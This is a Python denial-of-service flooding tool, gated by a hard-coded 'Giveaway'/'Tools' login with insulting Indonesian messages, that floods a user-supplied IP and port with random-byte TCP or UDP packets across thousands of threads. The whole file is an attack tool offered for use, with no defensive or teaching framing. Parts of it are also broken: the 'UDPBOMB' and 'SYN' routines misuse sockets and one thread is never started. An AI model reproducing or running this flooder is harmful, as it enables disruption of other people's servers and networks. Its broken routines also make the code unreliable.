import random
import time
import os
import threading
import socket
attemps = 0

while attemps < 100:
    username = input('Enter Username >> ')
    password = input('Enter Password >> ')

    if username == 'Giveaway' and password == 'Tools':
        print("PASSWORD DAN USERNAME BENAR COK!,TUNGGU BENTAR!!")
        time.sleep(2.0)
        break
    else:
        print("PASSWORD DAN USERNAME SALAH,INPUT YANG BENER LAH GOBLOK!")
        attemps += 1
        continue
os.system("clear")

logo = """
\031[91m████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
\033[91m    ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
\036[91m░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
\034[91m░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
\035[91m░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
\037[91m░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░
"""

banner = """
\033[91m█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀
\033[91m█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄
\033[91m|-----------------------|
\033[91m|   TCP    | 80  | 3389 |
\033[91m|   SYN    | 80  | 3389 |
\033[91m|   UDP    |17091| 7777 |
\033[91m] UDPBOMB  |17091| 7777 |
\033[91m|----------|------------|
"""

print(banner)
"n/"
method = str(input("Enter Method >> "))
if method == "TCP" or method == "SYN" or method == "UDP" or method == "UDPBOMB":
    print("METHOD VALID! PLEASE WAIT..")
    time.sleep(2.0)
else:
    print("ERROR! METHOD INVALID!")
    time.sleep(20)

os.system("clear")
print(logo)
"n/"

ip = str(input("Enter IP >> "))
port = int(input("Enter PORT >> "))
times = int(input("Enter Time >> "))

def TCP():
    packet = random.randint(1024, 8192)
    byte_packet = random._urandom(packet)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((ip, port))
            sock.send(byte_packet)
            sock.sendall(byte_packet)
            for x in range(times):
                sock.send(byte_packet)
                sock.sendall(byte_packet)
            print(f"Attacking On {ip}:{port} with TCP")
        except socket.error:
            print(f"Attacking On {ip}:{port} with TCP")
            sock.close()

def UDP():
    packet = random.randint(1024, 8192)
    byte_packet = random._urandom(packet)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.connect((ip, port))
            sock.send(byte_packet)
            sock.send(byte_packet)
            for x in range(times):
                sock.sendall(byte_packet)
                sock.sendall(byte_packet)
            print(f"Attacking On {ip}:{port} with UDP")
        except socket.error:
            print(f"Attacking On {ip}:{port} with UDP")
            sock.close()
 
def UDPBOMB():
    packet = random.randint(1024, 8192)
    byte_packet = random._urandom(packet)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            s.setsockopt(socket.SOL_SOCKET, socket .SO_SNDBUF, 65507)
            sock.connect((ip,port))
            sock.send(byte_packet)
            sock.send(byte_packet)
            for x in range(times):
                sock.sendall(byte_packet)
                sock.sendall(byte_packet)
            print(f"Attacking On {ip}:{port} with UDP")
        except socket.error:
            print(f"Attacking On {ip}:{port} with UDP")
            sock.close()
    
        
def SYN():
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.connect((ip, port))
    byteurandom = random._urandom(10145)
    while True:
        try:
            sock.sendto(byteurandom, (ip, port))
            for x in range(times):
                sock.sendto(byteurandom, (ip, port))
            print(f"Attacking On {ip}:{port} with SYN!")
        except socket.error:
            print(f"Attacking On {ip}:{port} with SYN!")
            sock.close()

for y in range(9024):
    if method == "TCP":
        t = threading.Thread(target =TCP)
        t.start()
    elif method == "UDPBOMB":
        t = threading.Thread(target =UDPBOMB)
        t.start
    elif method == "UDP":
        t = threading.Thread(target =UDP)
        t.start()
    elif method == "SYN":
        t = threading.Thread(target =SYN)
        t.start()


